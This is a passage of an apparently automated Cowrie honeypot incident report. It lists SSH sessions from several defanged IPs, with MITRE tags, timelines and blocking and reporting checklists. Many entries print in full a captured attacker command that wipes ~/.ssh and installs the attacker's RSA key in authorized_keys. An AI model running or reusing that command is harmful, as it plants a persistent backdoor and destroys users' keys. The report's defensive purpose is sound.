| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:22:59` | `cowrie.session.connect` |
| `2026-04-14 17:22:59` | `cowrie.client.version` |
| `2026-04-14 17:22:59` | `cowrie.client.kex` |
| `2026-04-14 17:22:59` | `cowrie.login.success` |
| `2026-04-14 17:23:00` | `cowrie.session.params` |
| `2026-04-14 17:23:00` | `cowrie.command.input` |
| `2026-04-14 17:23:00` | `cowrie.command.failed` |
| `2026-04-14 17:23:00` | `cowrie.log.closed` |
| `2026-04-14 17:23:00` | `cowrie.session.params` |
| `2026-04-14 17:23:00` | `cowrie.command.input` |
| `2026-04-14 17:23:00` | `cowrie.session.file_download` |
| `2026-04-14 17:23:00` | `cowrie.log.closed` |
| `2026-04-14 17:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a09fb6e8dd

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:23 |
| **Last Seen** | 2026-04-14 17:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:23:02` | `cowrie.session.connect` |
| `2026-04-14 17:23:02` | `cowrie.client.version` |
| `2026-04-14 17:23:02` | `cowrie.client.kex` |
| `2026-04-14 17:23:02` | `cowrie.login.success` |
| `2026-04-14 17:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe0032ee7a96

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:23 |
| **Last Seen** | 2026-04-14 17:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:23:03` | `cowrie.session.connect` |
| `2026-04-14 17:23:03` | `cowrie.client.version` |
| `2026-04-14 17:23:03` | `cowrie.client.kex` |
| `2026-04-14 17:23:04` | `cowrie.login.success` |
| `2026-04-14 17:23:05` | `cowrie.session.params` |
| `2026-04-14 17:23:05` | `cowrie.command.input` |
| `2026-04-14 17:23:05` | `cowrie.command.failed` |
| `2026-04-14 17:23:05` | `cowrie.log.closed` |
| `2026-04-14 17:23:06` | `cowrie.session.params` |
| `2026-04-14 17:23:06` | `cowrie.command.input` |
| `2026-04-14 17:23:06` | `cowrie.session.file_download` |
| `2026-04-14 17:23:06` | `cowrie.log.closed` |
| `2026-04-14 17:23:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6740cf6003

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:23 |
| **Last Seen** | 2026-04-14 17:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:23:10` | `cowrie.session.connect` |
| `2026-04-14 17:23:10` | `cowrie.client.version` |
| `2026-04-14 17:23:10` | `cowrie.client.kex` |
| `2026-04-14 17:23:11` | `cowrie.login.success` |
| `2026-04-14 17:23:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b1176d2558c

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:24 |
| **Last Seen** | 2026-04-14 17:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:24:24` | `cowrie.session.connect` |
| `2026-04-14 17:24:24` | `cowrie.client.version` |
| `2026-04-14 17:24:24` | `cowrie.client.kex` |
| `2026-04-14 17:24:25` | `cowrie.login.success` |
| `2026-04-14 17:24:26` | `cowrie.session.params` |
| `2026-04-14 17:24:26` | `cowrie.command.input` |
| `2026-04-14 17:24:26` | `cowrie.command.failed` |
| `2026-04-14 17:24:26` | `cowrie.log.closed` |
| `2026-04-14 17:24:27` | `cowrie.session.params` |
| `2026-04-14 17:24:27` | `cowrie.command.input` |
| `2026-04-14 17:24:27` | `cowrie.session.file_download` |
| `2026-04-14 17:24:27` | `cowrie.log.closed` |
| `2026-04-14 17:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b29f1a31a0fc

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:24 |
| **Last Seen** | 2026-04-14 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:24:30` | `cowrie.session.connect` |
| `2026-04-14 17:24:30` | `cowrie.client.version` |
| `2026-04-14 17:24:30` | `cowrie.client.kex` |
| `2026-04-14 17:24:31` | `cowrie.login.success` |
| `2026-04-14 17:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1c10b40897c

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:24 |
| **Last Seen** | 2026-04-14 17:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:24:45` | `cowrie.session.connect` |
| `2026-04-14 17:24:45` | `cowrie.client.version` |
| `2026-04-14 17:24:45` | `cowrie.client.kex` |
| `2026-04-14 17:24:45` | `cowrie.login.success` |
| `2026-04-14 17:24:45` | `cowrie.session.params` |
| `2026-04-14 17:24:45` | `cowrie.command.input` |
| `2026-04-14 17:24:45` | `cowrie.command.failed` |
| `2026-04-14 17:24:45` | `cowrie.log.closed` |
| `2026-04-14 17:24:46` | `cowrie.session.params` |
| `2026-04-14 17:24:46` | `cowrie.command.input` |
| `2026-04-14 17:24:46` | `cowrie.session.file_download` |
| `2026-04-14 17:24:46` | `cowrie.log.closed` |
| `2026-04-14 17:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57e4fcab2c8d

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:24 |
| **Last Seen** | 2026-04-14 17:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:24:48` | `cowrie.session.connect` |
| `2026-04-14 17:24:48` | `cowrie.client.version` |
| `2026-04-14 17:24:48` | `cowrie.client.kex` |
| `2026-04-14 17:24:48` | `cowrie.login.success` |
| `2026-04-14 17:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e620acd9a953

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:24 |
| **Last Seen** | 2026-04-14 17:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:24:50` | `cowrie.session.connect` |
| `2026-04-14 17:24:50` | `cowrie.client.version` |
| `2026-04-14 17:24:50` | `cowrie.client.kex` |
| `2026-04-14 17:24:51` | `cowrie.login.success` |
| `2026-04-14 17:24:52` | `cowrie.session.params` |
| `2026-04-14 17:24:52` | `cowrie.command.input` |
| `2026-04-14 17:24:52` | `cowrie.command.failed` |
| `2026-04-14 17:24:52` | `cowrie.log.closed` |
| `2026-04-14 17:24:53` | `cowrie.session.params` |
| `2026-04-14 17:24:53` | `cowrie.command.input` |
| `2026-04-14 17:24:53` | `cowrie.session.file_download` |
| `2026-04-14 17:24:53` | `cowrie.log.closed` |
| `2026-04-14 17:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93b3e600297f

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:24 |
| **Last Seen** | 2026-04-14 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:24:57` | `cowrie.session.connect` |
| `2026-04-14 17:24:57` | `cowrie.client.version` |
| `2026-04-14 17:24:57` | `cowrie.client.kex` |
| `2026-04-14 17:24:58` | `cowrie.login.success` |
| `2026-04-14 17:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc775b94f317

| Field | Detail |
|---|---|
| **Source IP** | `162.19.243[.]145` |
| **First Seen** | 2026-04-14 17:25 |
| **Last Seen** | 2026-04-14 17:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:25:26` | `cowrie.session.connect` |
| `2026-04-14 17:25:26` | `cowrie.client.version` |
| `2026-04-14 17:25:26` | `cowrie.client.kex` |
| `2026-04-14 17:25:27` | `cowrie.login.success` |
| `2026-04-14 17:25:27` | `cowrie.session.params` |
| `2026-04-14 17:25:27` | `cowrie.command.input` |
| `2026-04-14 17:25:27` | `cowrie.command.failed` |
| `2026-04-14 17:25:27` | `cowrie.log.closed` |
| `2026-04-14 17:25:27` | `cowrie.session.params` |
| `2026-04-14 17:25:27` | `cowrie.command.input` |
| `2026-04-14 17:25:28` | `cowrie.session.file_download` |
| `2026-04-14 17:25:28` | `cowrie.log.closed` |
| `2026-04-14 17:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.19.243[.]145` to AbuseIPDB if not already reported
- [ ] Block `162.19.243[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2285e7bcf6b

| Field | Detail |
|---|---|
| **Source IP** | `162.19.243[.]145` |
| **First Seen** | 2026-04-14 17:25 |
| **Last Seen** | 2026-04-14 17:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:25:30` | `cowrie.session.connect` |
| `2026-04-14 17:25:30` | `cowrie.client.version` |
| `2026-04-14 17:25:30` | `cowrie.client.kex` |
| `2026-04-14 17:25:30` | `cowrie.login.success` |
| `2026-04-14 17:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.19.243[.]145` to AbuseIPDB if not already reported
- [ ] Block `162.19.243[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efb8341dad07

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:26 |
| **Last Seen** | 2026-04-14 17:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:26:19` | `cowrie.session.connect` |
| `2026-04-14 17:26:19` | `cowrie.client.version` |
| `2026-04-14 17:26:19` | `cowrie.client.kex` |
| `2026-04-14 17:26:20` | `cowrie.login.success` |
| `2026-04-14 17:26:20` | `cowrie.session.params` |
| `2026-04-14 17:26:20` | `cowrie.command.input` |
| `2026-04-14 17:26:20` | `cowrie.command.failed` |
| `2026-04-14 17:26:20` | `cowrie.log.closed` |
| `2026-04-14 17:26:20` | `cowrie.session.params` |
| `2026-04-14 17:26:20` | `cowrie.command.input` |
| `2026-04-14 17:26:20` | `cowrie.session.file_download` |
| `2026-04-14 17:26:20` | `cowrie.log.closed` |
| `2026-04-14 17:26:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2b559b8a284

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:26 |
| **Last Seen** | 2026-04-14 17:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:26:22` | `cowrie.session.connect` |
| `2026-04-14 17:26:22` | `cowrie.client.version` |
| `2026-04-14 17:26:22` | `cowrie.client.kex` |
| `2026-04-14 17:26:23` | `cowrie.login.success` |
| `2026-04-14 17:26:23` | `cowrie.session.params` |
| `2026-04-14 17:26:23` | `cowrie.command.input` |
| `2026-04-14 17:26:23` | `cowrie.command.failed` |
| `2026-04-14 17:26:23` | `cowrie.log.closed` |
| `2026-04-14 17:26:23` | `cowrie.session.params` |
| `2026-04-14 17:26:23` | `cowrie.command.input` |
| `2026-04-14 17:26:23` | `cowrie.session.file_download` |
| `2026-04-14 17:26:23` | `cowrie.log.closed` |
| `2026-04-14 17:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cd90744ae02

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:26 |
| **Last Seen** | 2026-04-14 17:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:26:22` | `cowrie.session.connect` |
| `2026-04-14 17:26:22` | `cowrie.client.version` |
| `2026-04-14 17:26:22` | `cowrie.client.kex` |
| `2026-04-14 17:26:23` | `cowrie.login.success` |
| `2026-04-14 17:26:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2624c81acf7c

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:26 |
| **Last Seen** | 2026-04-14 17:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:26:25` | `cowrie.session.connect` |
| `2026-04-14 17:26:25` | `cowrie.client.version` |
| `2026-04-14 17:26:25` | `cowrie.client.kex` |
| `2026-04-14 17:26:26` | `cowrie.login.success` |
| `2026-04-14 17:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b480027975b7

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:26 |
| **Last Seen** | 2026-04-14 17:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:26:38` | `cowrie.session.connect` |
| `2026-04-14 17:26:38` | `cowrie.client.version` |
| `2026-04-14 17:26:39` | `cowrie.client.kex` |
| `2026-04-14 17:26:40` | `cowrie.login.success` |
| `2026-04-14 17:26:41` | `cowrie.session.params` |
| `2026-04-14 17:26:41` | `cowrie.command.input` |
| `2026-04-14 17:26:41` | `cowrie.command.failed` |
| `2026-04-14 17:26:41` | `cowrie.log.closed` |
| `2026-04-14 17:26:42` | `cowrie.session.params` |
| `2026-04-14 17:26:42` | `cowrie.command.input` |
| `2026-04-14 17:26:42` | `cowrie.session.file_download` |
| `2026-04-14 17:26:42` | `cowrie.log.closed` |
| `2026-04-14 17:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8fc3b772f24

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:26 |
| **Last Seen** | 2026-04-14 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:26:46` | `cowrie.session.connect` |
